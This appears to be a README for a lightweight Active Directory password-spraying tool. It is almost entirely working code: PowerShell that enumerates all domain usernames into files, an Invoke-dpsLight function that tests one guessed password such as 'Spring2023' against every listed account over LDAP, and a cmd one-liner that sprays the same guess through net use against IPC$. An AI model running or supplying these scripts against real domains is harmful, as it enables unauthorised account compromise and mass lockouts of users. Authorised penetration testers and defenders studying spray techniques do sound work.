# DomainPasswordSprayLight

Kudos to Beau Bullock and his [Domain Password Spray Script](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) of which this is a simplification.

## Gather Domain Usernames

Run the following to get a PowerShell object called $AllUserObjects that you can interact with to sort, filter and write seletected usernames to a file of your choosing.

```PowerShell
$UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
$DirEntry = New-Object System.DirectoryServices.DirectoryEntry
$UserSearcher.SearchRoot = $DirEntry
$UserSearcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$Filter = ""
$UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
$UserSearcher.PageSize = 1000

Write-Host -ForegroundColor Cyan "Searching for all users, this may take several minutes."
$AllUserObjects = $UserSearcher.FindAll()
Write-Host -ForegroundColor "yellow" ("[*] " + $AllUserObjects.count + " total users found.")
```

### Write all usernames to a file

```PowerShell
$outfile = "all-user.txt"
Remove-Item $outfile -ErrorAction Ignore
$AllUserObjects.Properties.samaccountname | add-content $outfile
```

### Write specific users to a file

In this example, the usernames are limited to only those that start with "ab"

```PowerShell
$outfile =  "all-ab-accounts.txt" 
Remove-Item $outfile -ErrorAction Ignore
($AllUserObjects | where-object {$_.Properties.samaccountname -like  "ab*"}).Properties.samaccountname | add-content $outfile
```
## Password Spray with PowerShell

First, copy and paste the Invoke-dpsLight function below into your PowerShell window. This will not run the password spray but will make the Invoke-dpsLight function available for us to use.

```PowerShell
function Invoke-dpsLight ($Password, $userlist) {
    $users = Get-Content $userlist
    $Domain = "LDAP://" + ([ADSI]"").distinguishedName
    $count = 0
    foreach ($User in $users) {
        $count = $count + 1
        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
        if ($Domain_check.name -ne $null) {
            Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
        }
        else {
            Write-Host "$count`:$User " -NoNewline
            # start-sleep -milliseconds 300
        }
    }
    Write-Host -ForegroundColor green "Finished"
}
```

Next, you can execute the follow to run the password spray. Be very careful. You could lock every user in the domain out using this script. Don't run it multiple times in a short period of time. In this example, `Spring2023` is the password guess and **all-ab-users.txt** is the list of usernames to try the password on.

```PowerShell
Invoke-dpsLight "Spring2023" all-ab-users.txt
```

Or, if you want to output the results to a file in addition to on the screen you can use the following.

```PowerShell
Invoke-dpsLight "Spring2023" all-ab-users.txt 2 *>&1 | tee -Append out.txt
```

## Password Spray from the Command Prompt

This method using a different method which generates different Windows event IDs. It is also much slower.

This example uses a password of `Spring2023` against a list of users called **users.txt** in the current directory.

```cmd
@FOR /F "delims=" %n in (users.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2023" 1>NUL 2>&1 && @echo [*] %n:"Spring2023" && @net use /delete %logonserver%\IPC$ > NUL
```
